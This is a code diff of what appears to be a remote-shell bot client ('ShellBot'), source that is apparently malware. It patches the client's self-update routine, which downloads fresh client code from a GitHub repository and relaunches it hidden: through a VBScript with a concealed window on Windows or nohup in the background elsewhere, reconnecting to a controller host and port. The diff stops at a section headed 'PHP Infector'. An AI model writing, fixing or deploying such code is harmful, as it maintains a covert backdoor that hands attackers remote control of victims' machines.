@@ -22,7 +22,7 @@
 ## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 ## IN THE SOFTWARE.
 
-import subprocess, os, sys, time, threading, smtplib, random, fnmatch
+import subprocess, os, sys, time, threading, smtplib, random, fnmatch, tempfile
 from socket import *
 from threading import Thread
 
@@ -60,7 +60,7 @@ def repeat(object, times=None):
 # Self Update
 temporary = """\
 #!/usr/bin/env python3
-import os, sys, urllib.request
+import os, sys, urllib.request, tempfile
 
 def getURL(owner, repo, name):
     import json
@@ -89,14 +89,14 @@ else:
     url = getURL('sayak-brm', 'ShellBot', 'client.py')
 
 if sys.platform == "win32":
-    if {frozen}: os.system({exe} + " {host} {port}")
+    if {frozen}: os.system("{exe} {host} {port}")
     else:
         runner = '''Dim WinScriptHost
 Set WinScriptHost = CreateObject("WScript.Shell")
-WinScriptHost.Run Chr(34) & "%s" & Chr(34), 0
-Set WinScriptHost = Nothing''' %({exe} + " " + {arg} + " {host} {port}")
-        with open("%tmp%/runner.vbs", "w") as f: f.write(runner)
-        os.system("%tmp%/runner.vbs")
+WinScriptHost.Run Chr(34) & "{exe} {arg} {host} {port}" & Chr(34), 0
+Set WinScriptHost = Nothing'''
+        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
+        os.system(tempfile.gettempdir() + "/runner.vbs")
 else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
 """.format(pid=os.getpid(), frozen=frozen, host=host, port=port, exe=sys.executable, arg=sys.argv[0])
 
@@ -113,8 +113,8 @@ def selfUpdate():
 Set WinScriptHost = CreateObject("WScript.Shell")
 WinScriptHost.Run Chr(34) & "%s" & Chr(34), 0
 Set WinScriptHost = Nothing''' %("{exe} {arg} {host} {port}".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
-        with open("%tmp%/runner.vbs", "w") as f: f.write(runner)
-        os.system("%tmp%/runner.vbs")
+        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
+        os.system(tempfile.gettempdir() + "/runner.vbs")
     else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
 
 # PHP Infector
